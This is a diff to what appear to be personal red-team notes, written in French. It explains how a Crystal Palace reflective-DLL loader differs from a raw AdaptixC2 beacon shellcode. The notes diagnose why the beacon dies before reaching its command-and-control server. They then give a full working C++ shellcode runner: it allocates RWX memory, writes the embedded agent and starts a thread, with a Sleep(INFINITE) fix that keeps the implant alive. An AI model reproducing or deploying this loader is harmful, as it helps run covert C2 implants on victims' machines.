@@ -72,3 +72,115 @@ cd /mnt/c/tcg/crystalpalace
 cpl link ../tradecraft/simple_rdll/loader.spec demo/test.x64.dll out.x64.bin
 ./demo/run.x64.exe out.x64.bin
 ```
+
+---
+# Lien avec Shellcode Runner
+## Sans Crystal Palace (raw .bin)
+
+Le .bin est du **position-independent shellcode** - c'est littéralement le beacon lui-même, compilé pour s'exécuter n'importe où en mémoire :
+
+```
+Thread → [shellcode = beacon loop] → écoute C2, exécute tâches, écoute C2...
+                                         ↑
+                               ne termine JAMAIS
+```
+
+Ton thread ne se termine pas → `WaitForSingleObject` attend indéfiniment → process reste en vie.
+
+## Avec Crystal Palace (RDLL)
+
+Le .bin est un **Reflective DLL Loader** - une petite stub qui fait le travail d'un loader Windows, mais depuis la mémoire :
+
+```
+Thread → [reflective loader] → 1. mappe la DLL en mémoire
+                               2. résout les imports
+                               3. applique les relocations
+                               4. appelle DllMain() → spawn nouveau thread (beacon)
+                               5. RETOURNE ← ici le thread se termine
+                                  
+                               [beacon thread] → tourne indépendamment
+```
+
+Le thread que **toi** tu as créé avec `CreateThread` se termine rapidement (step 5). Le beacon tourne dans un thread que le loader a spawné lui-même.
+
+## Pourquoi ça crashait
+
+```
+CreateThread(loader) → loader termine → hThread signalé
+                                              ↓
+                                    WaitForSingleObject revient
+                                              ↓
+                                        main() return
+                                              ↓
+                                    process exit → tous les threads tués
+                                              ↓
+                                    beacon mort avant d'avoir parlé au C2
+```
+
+Avec `Sleep(INFINITE)`, le process reste en vie peu importe ce que fait le thread initial - le beacon thread survit et fonctionne normalement.
+
+**Avec un .bin brut** (AdaptixC2) : le shellcode **est** la boucle beacon — le thread ne finit jamais, `WaitForSingleObject` attend indéfiniment → process reste en vie.
+**Avec Crystal Palace (RDLL)** : le shellcode est un _reflective loader_ — il charge la DLL en mémoire, lance le beacon dans son **propre thread**, puis **retourne**. Donc :
+1. Le thread créé par `CreateThread` termine rapidement
+2. `WaitForSingleObject(hThread, ...)` revient immédiatement
+3. `main()` se termine → process exit → ton beacon meurt avec lui
+
+**Fix** - remplace `WaitForSingleObject` par `Sleep(INFINITE)` pour garder le process en vie indépendamment de ce que fait le shellcode :
+
+**En résumé** : `WaitForSingleObject(hThread)` marche avec un raw shellcode parce que _ce thread_ est le beacon. Avec RDLL, _ce thread_ est juste un intermédiaire - le vrai beacon vit ailleurs.
+
+## Classic injection
+```cpp
+#include <Windows.h>
+#include "shellcode.h"
+
+int main()
+{
+    unsigned char* shellcode = agent_x64_bin;
+    unsigned int shellcode_len = agent_x64_bin_len;
+
+    // allocate a region of memory
+    auto hMemory = VirtualAlloc(
+        NULL,                       // we don't mind where it's allocated
+        shellcode_len,          // the size of memory region
+        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
+        PAGE_EXECUTE_READWRITE      // memory protection
+    );
+    
+    // write the shellcode into memory
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        GetCurrentProcess(),    // handle to target process
+        hMemory,                // pointer to target memory region
+        shellcode,             // pointer to data to write
+        shellcode_len,      // length of data to write
+        &bytesWritten           // receives the number of bytes written
+    );
+
+    // create a new thread
+    DWORD threadId = 0;
+    auto hThread = CreateThread(
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
+        NULL,
+        0,
+        &threadId                         // receives the new thread ID
+    );
+
+    // wait for the thread to finish
+    // Pas avec CrystalPalace
+    // WaitForSingleObject(
+    //     hThread,    // the handle to wait on
+    //     INFINITE    // the length of time to wait
+    // );
+    
+    // close the thread handle
+    CloseHandle(hThread);
+
+    // With RDLL shellcode (Crystal Palace), the loader thread exits quickly after
+    // spawning the agent in its own thread. Sleep(INFINITE) keeps this process alive
+    // regardless of what the shellcode thread does.
+    Sleep(INFINITE);
+}
+```
